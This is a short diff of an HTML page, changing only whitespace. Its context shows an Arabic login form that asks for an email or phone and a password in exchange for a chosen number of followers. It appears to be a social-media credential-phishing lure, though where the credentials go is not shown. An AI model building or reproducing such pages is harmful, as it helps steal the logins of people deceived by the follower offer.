@@ -53,13 +53,14 @@
       <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
       <input type="password" id="password" placeholder="كلمة السر" required>
       
-    <div> اختر عدد المتابعين</div>
+   <div> اختر عدد المتابعين</div>
       <select id="followers">
         <option value="1000">1000</option>
         <option value="5000">5000</option>
       </select>
       <button type="submit">تسجيل الدخول</button>
     </form>
+    
   <script>
   window.onload = function () {
     const params = new URLSearchParams(window.location.search);
@@ -107,5 +108,6 @@
       });
   });
 </script>
+
 </body>
 </html>
